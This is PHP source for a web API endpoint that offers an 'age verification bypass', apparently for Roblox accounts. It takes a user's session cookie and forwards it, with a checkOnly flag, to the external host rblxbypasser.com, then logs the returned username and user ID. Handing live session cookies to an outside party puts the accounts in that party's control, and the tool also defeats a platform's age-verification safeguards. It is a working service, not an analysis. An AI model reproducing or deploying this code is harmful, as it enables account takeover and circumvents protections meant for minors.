<?php
/**
 * ============================================
 * BYPASSERV3 - BYPASS API ENDPOINT
 * Secure age verification bypass
 * ============================================
 */

// Headers
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Load dependencies
require_once '../config.php';
require_once '../functions.php';

// ============================================
// SECURITY CHECKS
// ============================================

// Random security scan
if (rand(1, 100) === 1) {
    securityScan(true);
}

// Random cleanup
if (rand(1, 50) === 1) {
    cleanupRateLimits();
}

// Method check
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode([
        'success' => false,
        'error' => 'Method not allowed'
    ]);
    logSecurityEvent('invalid_method', [
        'method' => $_SERVER['REQUEST_METHOD']
    ]);
    exit;
}

// Suspicious request check
if (isSuspiciousRequest()) {
    logSecurityEvent('suspicious_request', [
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'None'
    ]);
}

// Rate limiting
$ip = getUserIP();
if (!checkRateLimit($ip, 50, 3600)) {
    http_response_code(429);
    echo json_encode([
        'success' => false,
        'error' => 'Rate limit exceeded',
        'message' => 'Maximum 50 requests per hour',
        'retry_after' => 3600
    ]);
    exit;
}

// Parse input
$rawInput = file_get_contents('php://input');
if (empty($rawInput)) {
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'error' => 'No input provided'
    ]);
    exit;
}

$input = json_decode($rawInput, true);

if (json_last_error() !== JSON_ERROR_NONE) {
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'error' => 'Invalid JSON',
        'message' => json_last_error_msg()
    ]);
    logSecurityEvent('invalid_json', [
        'error' => json_last_error_msg()
    ]);
    exit;
}

// Extract data
$cookie = trim($input['cookie'] ?? '');
$checkOnly = $input['checkOnly'] ?? false;

// Validate cookie
if (empty($cookie)) {
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'error' => 'Cookie required'
    ]);
    exit;
}

if (!validateCookie($cookie)) {
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'error' => 'Invalid cookie format',
        'message' => 'Cookie appears invalid or suspicious'
    ]);
    logSecurityEvent('suspicious_cookie_attempt', [
        'ip' => $ip,
        'cookie_length' => strlen($cookie)
    ]);
    exit;
}

// ============================================
// BYPASS PROCESSING
// ============================================

$externalApiUrl = 'https://rblxbypasser.com/api/bypass';
$postData = json_encode([
    'cookie' => $cookie,
    'checkOnly' => $checkOnly
]);

$ch = curl_init($externalApiUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_TIMEOUT, $checkOnly ? 30 : 120);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
curl_close($ch);

// Handle errors
if ($response === false || !empty($curlError)) {
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => 'Request failed',
        'message' => 'Failed to connect to bypass service'
    ]);
    logSecurityEvent('bypass_request_failed', [
        'curl_error' => $curlError
    ]);
    exit;
}

if ($httpCode !== 200) {
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'error' => 'Request failed',
        'message' => 'Failed to process request'
    ]);
    logSecurityEvent('bypass_http_error', [
        'http_code' => $httpCode
    ]);
    exit;
}

// Parse response
$data = json_decode($response, true);

if (!$data || !isset($data['success'])) {
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'error' => 'Invalid response'
    ]);
    exit;
}

if (!$data['success']) {
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'error' => 'Request failed',
        'message' => $data['message'] ?? 'Unknown error'
    ]);
    exit;
}

// Log success
if (!$checkOnly) {
    logSecurityEvent('successful_bypass', [
        'username' => $data['userInfo']['username'] ?? 'Unknown',
        'userId' => $data['userInfo']['userId'] ?? 'Unknown'
    ]);
}

// Return response
echo json_encode($data);
?>
